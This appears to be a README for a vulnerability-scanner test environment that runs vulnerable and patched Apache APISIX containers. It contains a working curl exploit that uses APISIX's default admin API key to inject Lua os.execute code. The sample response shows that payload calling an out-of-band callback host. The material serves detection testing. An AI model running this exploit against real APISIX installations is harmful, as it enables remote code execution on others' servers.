# Apache APISIX Default API Token


This directory contains the deployment configs for an Apache APISIX installation
Apache APISIX has a built-in default API KEY. If the user does not proactively modify it (which few will), Lua scripts
can be executed directly through the API interface, which can lead to RCE vulnerabilities. Normally, the admin API endpoints are restricted by the client IP address, but this tests for a case where other IP addresses have been allowed. See the `allow_admin` part of the configuration files.

You can start both the vulnerable service and safe service by running the command `docker compose up -d`. The vulnerable container listens on port `8081`, and the safe container listens on port `8082`.

In this case, the vulnerable service uses APISIX with the default API key, and the safe service uses APISIX with a changed API key using the `config_api_key_change.yml` file.

## Testing the vulnerability

Run the following command, replacing `YOUR_COMMAND_HERE` with the command you want to execute (this won't be executed from this curl command alone, you need to execute the route too): 
```
curl -X PUT "http://localhost:8081/apisix/admin/routes/tsunami_rce?ttl=30" \
  -H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1" \
  -H "Content-Type: application/json" \
  -d '{
    "uri": "/test/anything",
    "upstream": {
      "type": "roundrobin",
      "nodes": {}
    },
    "name": "anything",
    "filter_func": "function(vars) return os.execute(\"YOUR_COMMAND_HERE\")==true end"
  }'
```

Vulnerable Response:
```
{"action":"set","lease_id":"7587895458205140304","node":{"value":{"update_time":1781195535,"filter_func":"function(vars) return os.execute(\"curl 132ovru87ms15vti1jl0vw77gymparyg.burpserver.doyentesting.com\")==true end","priority":0,"id":"tsunami_rce","name":"anything","create_time":1781195535,"uri":"\/test\/anything","status":1,"upstream":{"scheme":"http","type":"roundrobin","hash_on":"vars","pass_host":"pass","nodes":{}}},"key":"\/apisix\/routes\/tsunami_rce"}}
```

Safe Response:
```
{"error_msg":"failed to check token"}
```
